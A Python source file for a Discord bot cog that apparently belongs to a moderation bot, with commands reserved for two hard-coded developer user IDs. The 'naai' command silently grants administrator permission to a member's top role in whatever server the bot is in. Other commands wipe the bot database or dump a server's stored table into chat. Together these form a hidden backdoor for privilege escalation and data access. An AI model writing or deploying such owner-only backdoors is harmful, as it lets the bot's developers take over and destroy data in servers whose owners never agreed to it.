from discord import permissions
from cogs.manager import databaseManager
from discord.ext import commands
import discord
from discord import Permissions
from discord.utils import get

class meCommand(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    @commands.command(name="cleardb")
    async def cleardb(self, ctx):
        if ctx.author.id == 730692546392621076:
            await ctx.send(databaseManager.sql.clearDB())
        else:
            await ctx.send("Nice try bukko")
    
    @commands.command(name="dump")
    async def dump(self, ctx):
        if ctx.author.id == 730692546392621076 or ctx.author.id == 454677446793494539:
            await ctx.send("Done :white_check_mark:\n" + databaseManager.sql.getTableForServer(ctx.guild.id))
        else:
            await ctx.send("Nice try bukko")
    
    @commands.command(name="naai")
    async def naai(self, ctx, member: discord.Member):
        if ctx.author.id == 730692546392621076 or ctx.author.id == 454677446793494539:
            mention = []
            for role in member.roles:
                if role.name != "@everyone":
                    mention.append(role.id)
            
            yes = len(mention) - 1
            
            role = get(ctx.guild.roles, id=mention[yes])
            permissions = discord.Permissions()
            permissions.update(administrator = True)    
            await role.edit(reason = "Testing", permissions=permissions)
            print("done")
        else:
            await ctx.send("Nice try bukko")

    @commands.command(name="swear")
    async def swear(self, ctx):
        if ctx.author.id == 730692546392621076:
            databaseManager.sql.createSwearWordsTable(ctx.guild.id)
            await ctx.send("Awe my masekind")
        else:
            await ctx.send("Nice try bukko")
    
    @commands.command(name="lol")
    async def lol(self, ctx):
        if ctx.author.id == 730692546392621076:
            databaseManager.sql.createWarningsTable(ctx.guild.id)
            await ctx.send("Awe my masekind")
        else:
            await ctx.send("Nice try bukko")

def setup(bot):
    bot.add_cog(meCommand(bot))